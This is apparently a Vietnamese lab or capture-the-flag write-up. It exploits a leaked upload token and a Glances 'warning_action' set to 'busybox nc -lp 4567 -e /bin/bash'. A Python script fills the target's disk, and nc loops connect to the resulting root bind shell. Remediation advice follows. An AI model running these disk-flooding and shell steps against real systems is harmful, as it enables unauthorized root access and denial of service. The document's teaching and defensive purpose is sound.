
Hoặc:


**Kết quả quan trọng:**

```json

  "warning": "80",
  "warning_action": "busybox nc -lp 4567 -e /bin/bash",
  "careful": "50",
  "critical": "90"
}
```

**Lỗ hổng:**

- Khi dung lượng filesystem đạt **≥ 80%**, Glances tự động chạy:
  ```bash
  busybox nc -lp 4567 -e /bin/bash
  ```
- Lệnh này mở **bind shell** trên port **4567**.
- Glances chạy với quyền **root** → shell nhận được là **root**.

> Trigger chỉ chạy **một lần** khi vượt ngưỡng. Cần lắng nghe port 4567 **trước** hoặc **ngay khi** disk đầy.

## 2.2. Chuẩn bị file upload và script stress

### 🟦 Kali

Tạo thư mục làm việc và file 1MB:

```bash
mkdir -p ~/ll104567 && cd ~/ll104567
dd if=/dev/urandom of=1MB.bin bs=1M count=1
```

Cài thư viện cần thiết:

```bash
pip3 install aiohttp --break-system-packages
```

Tạo script `stress.py` (đã điều chỉnh IP = 10.0.2.21):

```bash
cat > stress.py << 'EOF'
import asyncio
import aiohttp
from time import time

async def upload_chunk(session, chunk_data, file_num, chunk_num):
    try:
        async with session.put(
            f'http://10.0.2.21:1045/api/files/{file_num}_{chunk_num}.bin',
            headers={'X-Session-Token': 'xixilake-session-secure-2025'},
            data=chunk_data
        ) as response:
            await response.read()
            return response.status
    except Exception as e:
        print(f"Error uploading file {file_num}, chunk {chunk_num}: {e}")
        return None

async def stress_test(total_gb, chunk_size_mb, concurrent_uploads):
    with open("1MB.bin", "rb") as f:
        chunk_data = f.read()

    total_chunks = (total_gb * 1024) // chunk_size_mb
    start_time = time()

    connector = aiohttp.TCPConnector(
        limit=concurrent_uploads,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True
    )

    timeout = aiohttp.ClientTimeout(total=60, connect=10)

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    ) as session:
        tasks = [
            upload_chunk(session, chunk_data, i // concurrent_uploads, i % concurrent_uploads)
            for i in range(total_chunks)
        ]

        completed = 0
        for i in range(0, len(tasks), concurrent_uploads):
            batch = tasks[i:i + concurrent_uploads]
            await asyncio.gather(*batch)
            completed += len(batch)
            elapsed = time() - start_time
            speed = (completed * chunk_size_mb / 1024) / elapsed if elapsed > 0 else 0
            print(f"Progress: {completed}/{total_chunks} chunks ({speed:.2f} GB/s)")

    elapsed = time() - start_time
    total_gb_actual = total_chunks * chunk_size_mb / 1024
    avg_speed = total_gb_actual / elapsed if elapsed > 0 else 0

    print("\nStress test complete:")
    print(f"  Total: {total_gb_actual:.2f} GB")
    print(f"  Time: {elapsed:.2f}s")
    print(f"  Avg Speed: {avg_speed:.2f} GB/s")

if __name__ == "__main__":
    # Bắt đầu với 5–10 GB nếu disk nhỏ, tăng dần nếu cần
    asyncio.run(stress_test(total_gb=21, chunk_size_mb=1, concurrent_uploads=50))
EOF
```

> **Ghi chú:** `total_gb=21` theo writeup gốc. Nếu disk target nhỏ hơn, giảm xuống `5` hoặc `10` rồi chạy lại. Có thể theo dõi dung lượng qua Glances UI hoặc API.

**Cách A – Bind shell (theo writeup):**

```bash

```

Hoặc dùng `rlwrap` cho shell ổn định hơn:

**Cách B – canh port 4567 và kết nối ngay khi mở:**  
```bash
while true; do
  echo "[*] Waiting for 10.0.2.21:4567 ..."
  
  # Thử kết nối, nếu thành công thì vào shell
  if rlwrap nc -nv 10.0.2.21 4567; then
    echo ""
    echo "[+] Connection closed. Waiting for next shell..."
    echo ""
  fi
  
  sleep 1
done
```
Hoặc phiên bản đẹp hơn (có màu + thời gian):
```bash
while true; do
  echo -e "\033[1;33m[*] $(date '+%H:%M:%S') - Waiting for 10.0.2.21:4567 ...\033[0m"
  
  if rlwrap nc -nv 10.0.2.21 4567; then
    echo -e "\n\033[1;32m[+] Session ended. Reconnecting in 1s...\033[0m\n"
  else
    echo -e "\033[1;31m[-] Connection failed\033[0m"
  fi
  
  sleep 1
done
```

Có thể sửa `warning_action` nếu API cho phép ghi config, nhưng theo writeup gốc chỉ cần bind shell sẵn có.

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân và đề xuất biện pháp ngăn chặn.**

## 3.1. Nguyên nhân chính

### 1. Session token lộ trong HTML comment

Token `xixilake-session-secure-2025` nằm trong source HTML của port 80, cho phép bất kỳ ai upload file qua API port 1045.

### 2. Glances `warning_action` thực thi lệnh shell nguy hiểm

Cấu hình:

```text
warning_action = busybox nc -lp 4567 -e /bin/bash
```

Khi filesystem đạt 80%, Glances (chạy root) tự động mở bind shell root. Không có xác thực, không có giới hạn.

### 3. API upload không kiểm soát dung lượng / rate-limit

Port 1045 cho phép upload không giới hạn (với token hợp lệ), dễ dàng làm đầy disk.

### 4. Chuỗi tác động

```text
Token lộ
    +
Upload không giới hạn
    +
warning_action = bind shell root
    =
Disk đầy → root shell
```

---

## 3.2. Biện pháp khắc phục

### Bảo vệ token và session

- Không bao giờ để token, credential trong HTML comment hoặc source code frontend.
- Dùng token ngắn hạn, có chữ ký, hết hạn.
- API upload phải xác thực mạnh (JWT, API key không lộ).

### Vô hiệu hóa / hạn chế warning_action

- Không cấu hình `warning_action` thành lệnh shell tùy ý.
- Nếu cần action, chỉ gửi alert (email, webhook, log) — không execute command.
- Chạy Glances với user không phải root (least privilege).

### Giới hạn upload và dung lượng

- Rate-limit, giới hạn kích thước file, quota theo user.
- Không cho phép upload làm đầy toàn bộ disk.
- Monitor và alert khi disk vượt ngưỡng an toàn (ví dụ 70%).

### Gia cố Glances / monitoring

- Bind Glances chỉ localhost hoặc mạng quản trị.
- Bật authentication cho Glances API.
- Không expose port 61208 ra ngoài.

### Least Privilege + Monitoring

- Tiến trình monitoring chạy với user riêng, không root.
- Theo dõi:
  - Upload bất thường trên port 1045
  - Process `nc` / `busybox` lắng nghe port lạ
  - Disk usage tăng đột biến
- Log và alert khi `warning_action` được kích hoạt.
